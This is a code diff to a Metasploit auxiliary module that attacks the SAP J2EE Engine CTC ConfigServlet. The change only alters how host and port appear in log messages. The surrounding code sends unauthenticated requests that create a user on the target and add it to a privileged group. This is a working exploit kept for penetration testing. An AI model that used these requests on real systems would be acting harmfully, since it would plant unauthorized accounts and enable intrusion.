@@ -59,19 +59,19 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(_ip)
-    vprint_status("#{rhost}:#{rport} - Creating User...")
+    vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - Creating User...")
     uri = '/ctc/ConfigServlet?param=com.sap.ctc.util.UserConfig;CREATEUSER;USERNAME=' + datastore['USERNAME'] + ',PASSWORD=' + datastore['PASSWORD']
     if send_request(uri)
-      print_good("#{rhost}:#{rport} - User #{datastore['USERNAME']} with password #{datastore['PASSWORD']} successfully created")
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - User #{datastore['USERNAME']} with password #{datastore['PASSWORD']} successfully created")
     else
       return
     end
 
-    vprint_status("#{rhost}:#{rport} - Adding User to Group...")
+    vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - Adding User to Group...")
     uri = '/ctc/ConfigServlet?param=com.sap.ctc.util.UserConfig;ADD_USER_TO_GROUP;USERNAME=' + datastore['USERNAME'] + ',GROUPNAME=' + datastore['GROUP']
     res = send_request(uri)
     if res
-      print_good("#{rhost}:#{rport} - User #{datastore['USERNAME']} added to group #{datastore['GROUP']}")
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - User #{datastore['USERNAME']} added to group #{datastore['GROUP']}")
     else
       return
     end
@@ -122,11 +122,11 @@ class MetasploitModule < Msf::Auxiliary
     if res && (res.code == 200) && res.headers['Server'] =~ /SAP J2EE Engine/
       return true
     elsif res
-      vprint_error("#{rhost}:#{rport} - Unexpected Response: #{res.code} #{res.message}")
+      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - Unexpected Response: #{res.code} #{res.message}")
       return false
     end
   rescue ::Rex::ConnectionError
-    vprint_error("#{rhost}:#{rport} - Unable to connect")
+    vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - Unable to connect")
     return false
   end
 end
